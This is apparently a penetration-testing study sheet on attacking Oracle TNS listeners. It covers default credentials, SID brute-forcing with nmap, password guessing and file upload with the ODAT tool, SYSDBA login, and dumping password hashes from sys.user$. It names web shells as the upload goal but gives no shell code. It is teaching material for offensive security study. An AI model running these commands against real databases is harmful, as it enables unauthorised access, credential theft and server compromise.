# Oracle TNS Enumeration & Exploitation

The **Oracle Transparent Network Substrate (TNS)** is a communication protocol used to facilitate interaction between Oracle databases and applications. It handles name resolution, connection management, and load balancing.

### Service Fundamentals

|Component|Description|
|:--|:--|
|**Default Port**|TCP/1521|
|**tnsnames.ora**|Client-side file used to resolve service names to network addresses.|
|**listener.ora**|Server-side file defining listener properties and database instances.|
|**SID**|**System Identifier**: A unique name identifying a specific database instance.|

**Dangerous Default Credentials**:

|Service/Version|Default Password|
|:--|:--|
|Oracle 9|`CHANGE_ON_INSTALL`|
|Oracle DBSNMP|`dbsnmp`|

---

### 1. Environment Setup

Install necessary dependencies and the **Oracle Database Attacking Tool (ODAT)** to automate enumeration and exploitation.

```
# Install dependencies
sudo apt-get update && sudo apt-get install -y build-essential python3-dev libaio1

# Install cx_Oracle
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz && cd cx_Oracle-8.3.0
python3 setup.py build && sudo python3 setup.py install

# Clone ODAT and install python requirements
git clone https://github.com/quentinhardy/odat.git && cd odat/
pip install python-libnmap
git submodule init && git submodule update
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

---

### 2. Initial Enumeration

**Goal:** Identify if the TNS listener is active and determine the version.

```
sudo nmap -p<PORT> -sV <TARGET_IP> --open
```

#### SID Bruteforcing

Connecting to an Oracle database requires a valid **SID**. If it is unknown, use Nmap to brute-force it.

- **Why it matters:** An incorrect SID results in a failed connection.

```
sudo nmap -p<PORT> -sV <TARGET_IP> --open --script oracle-sid-brute
```

---

### 3. Automated Exploitation with ODAT

Use ODAT's `all` module to perform a comprehensive scan, including service enumeration and **password guessing**.

```
./odat.py all -s <TARGET_IP> -p <PORT>
```

- **Attack Implication:** Success identifies valid credentials (e.g., `<USERNAME>/<PASSWORD>`) to gain initial database access.

---

### 4. Database Interaction & Privilege Escalation

Once credentials are found, use `sqlplus` to interact with the RDBMS.

#### Basic Connection

```
sqlplus <USERNAME>/<PASSWORD>@<TARGET_IP>/<SID>
```

#### Escalating to SYSDBA

If the user account has sufficient permissions, log in as the **System Database Administrator (SYSDBA)** to gain administrative control.

- **When to use:** Use when the current user needs higher privileges to perform restricted actions like hash extraction.

```
sqlplus <USERNAME>/<PASSWORD>@<TARGET_IP>/<SID> as sysdba
```

#### Manual Enumeration Commands

|Action|SQL Command|
|:--|:--|
|**List Tables**|`select table_name from all_tables;`|
|**Check Roles/Privs**|`select * from user_role_privs;`|

---

### 5. Post-Exploitation

#### Extracting Password Hashes

Administrative access allows the extraction of hashes from the `sys.user$` table for offline cracking.

```
select name, password from sys.user$;
```

#### Arbitrary File Upload

If ODAT's `utlfile` module is available and the system is misconfigured, you can upload files (such as web shells) to the target.

**Default Web Roots:**

- **Linux:** `/var/www/html`
- **Windows:** `C:\inetpub\wwwroot`

**Step 1:** Create a test file.

```
echo "Oracle File Upload Test" > testing.txt
```

**Step 2:** Upload via ODAT.

```
./odat.py utlfile -s <TARGET_IP> -d <SID> -U <USERNAME> -P <PASSWORD> --sysdba --putFile <REMOTE_PATH> testing.txt ./testing.txt
```

**Step 3:** Verify upload.

```
curl -X GET http://<TARGET_IP>/testing.txt
```

---

### Configuration Parameter Reference

| Parameter         | Description                                  |
| :---------------- | :------------------------------------------- |
| **DESCRIPTION**   | Name for the database and connection type.   |
| **ADDRESS**       | Network address (Hostname and Port).         |
| **PROTOCOL**      | Communication protocol (e.g., TCP).          |
| **CONNECT_DATA**  | Connection attributes (SID or Service Name). |
| **INSTANCE_NAME** | The specific database instance identifier.   |
| **SERVER**        | Type of server (Dedicated or Shared).        |